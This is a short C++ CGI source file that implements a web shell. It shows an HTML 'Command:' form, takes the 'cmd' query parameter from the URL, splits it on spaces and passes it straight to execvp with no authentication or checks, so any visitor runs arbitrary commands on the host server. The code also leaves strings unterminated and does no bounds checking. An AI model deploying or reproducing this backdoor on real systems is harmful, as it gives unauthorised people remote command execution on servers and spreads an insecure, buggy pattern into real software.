#include<cstdio>
#include<iostream>
#include<string>
#include<unistd.h>
#include<cstdlib>
#include<cstring>
#include<string>
#include<sstream>
#include "cgicc/Cgicc.h"		   //need to install library
#include "cgicc/HTTPHTMLHeader.h"  //need to install library
#include "cgicc/HTMLClasses.h"     //need to install library

using namespace std;
using namespace cgicc;

int main(){
	char *cmd[1024];
	string str;
	vector<string> result;	
	str=getenv("QUERY_STRING");
	if(str.length() >= 4 ){
		str = str.substr(4);		//remove cmd=
		str = form_urldecode(str);	//url decoding function
	}else if(!str.empty())
		return 0;
	int i = 0;
	stringstream ss(str);
	string s;
	while( getline(ss ,s , ' ' ))	//seperate command by space
		result.push_back(s);
	cout << "Content-Type: text/html\n\n" << endl;
	cout << "<form method=\"GET\">" << endl;
	cout << "Command:" << endl;
	cout << "<input type=\"text\" name=\"cmd\"></form>" << endl;
	if(!str.empty()){
		for(int i = 0 ; i < result.size() ; i++){
			cmd[i] = new char[result[i].length()+1 ];		
			strncpy(cmd[i], result[i].c_str() ,result[i].length());
		}
		cmd[result.size()] = new char;
		cmd[result.size()]=0;	
		execvp(cmd[0],cmd);			//run command
	}
	return 0;
}
